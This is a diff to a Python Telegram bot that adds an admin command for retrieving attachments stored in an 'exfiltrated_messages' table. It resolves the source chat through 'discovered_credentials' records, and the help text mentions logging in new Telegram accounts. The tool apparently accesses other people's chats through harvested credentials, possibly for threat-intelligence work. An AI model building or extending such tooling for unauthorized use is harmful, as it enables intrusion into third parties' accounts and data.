@@ -206,6 +206,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "• /starthunter - Login a new Telegram account\n"
             "• /bots - Show all available bots\n"
             "• /telemetry - Show canonical telemetry analytics\n"
+            "• /getfile <message-id> - Retrieve an archived attachment on demand\n"
             "• /backfill - Re-broadcast messages stuck in General topic\n\n"
             f"**Available Bots**: {bot_list}\n\n"
             "Only authorized administrators can use these commands."
@@ -344,6 +345,94 @@ async def telemetry_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logger.error(f"Telemetry summary failed: {e}")
         await update.message.reply_text("❌ Telemetry analytics are temporarily unavailable.")
+
+
+def _is_uuid(value: str) -> bool:
+    try:
+        uuid.UUID(value)
+        return True
+    except (TypeError, ValueError):
+        return False
+
+
+async def _fetch_attachment_message(target_id: str) -> dict[str, Any] | None:
+    if _is_uuid(target_id):
+        response = await _execute_db(
+            db.table("exfiltrated_messages")
+            .select("*")
+            .eq("id", target_id)
+            .limit(1)
+        )
+    elif target_id.isdigit():
+        response = await _execute_db(
+            db.table("exfiltrated_messages")
+            .select("*")
+            .eq("telegram_msg_id", int(target_id))
+            .limit(1)
+        )
+    else:
+        return None
+    rows = response.data or []
+    return rows[0] if rows else None
+
+
+async def _resolve_attachment_source_chat_id(row: dict[str, Any]) -> int | str | None:
+    if row.get("chat_id"):
+        return row["chat_id"]
+
+    credential_id = row.get("credential_id")
+    if not credential_id:
+        return None
+
+    response = await _execute_db(
+        db.table("discovered_credentials")
+        .select("chat_id")
+        .eq("id", credential_id)
+        .limit(1)
+    )
+    rows = response.data or []
+    if not rows:
+        return None
+    return rows[0].get("chat_id")
+
+
+async def getfile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update):
+        await update.message.reply_text("⚠️ This command is restricted to administrators.")
+        return
+
+    target_id = (context.args[0] if context and context.args else "").strip()
+    if not target_id:
+        await update.message.reply_text("Usage: /getfile <telegram_msg_id or message UUID>")
+        return
+
+    row = await _fetch_attachment_message(target_id)
+    if not row:
+        await update.message.reply_text("Attachment message not found.")
+        return
+
+    if row.get("media_type") in (None, "text"):
+        await update.message.reply_text("That message does not contain an attachment payload.")
+        return
+
+    source_chat_id = await _resolve_attachment_source_chat_id(row)
+    if not source_chat_id:
+        await update.message.reply_text("Attachment source chat is unavailable for this record.")
+        return
+
+    await update.message.reply_text("⏳ Retrieving transient attachment from storage...")
+    from app.services.user_agent_srv import user_agent
+
+    ok = await user_agent.archive_media_transiently(
+        source_chat_id,
+        int(row["telegram_msg_id"]),
+        target_chat_id=update.effective_chat.id,
+        caption=f"Archived Attachment [ID: {row['id']}]",
+    )
+    if ok:
+        await update.message.reply_text("✅ Attachment retrieval complete.")
+    else:
+        await update.message.reply_text("Attachment payload is no longer available upstream.")
 
 async def backfill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Triggers re-broadcast of messages stuck in General topic."""
@@ -919,6 +1008,8 @@ def _build_application(token: str) -> Application:
     application.add_handler(CommandHandler("bots", bots_command))
     application.add_handler(CommandHandler("telemetry", telemetry_command))
     application.add_handler(CommandHandler("indicators", telemetry_command))
+    application.add_handler(CommandHandler("getfile", getfile_command))
+    application.add_handler(CommandHandler("archive", getfile_command))
     application.add_handler(CommandHandler("backfill", backfill_command))
 
     login_conv_handler = ConversationHandler(
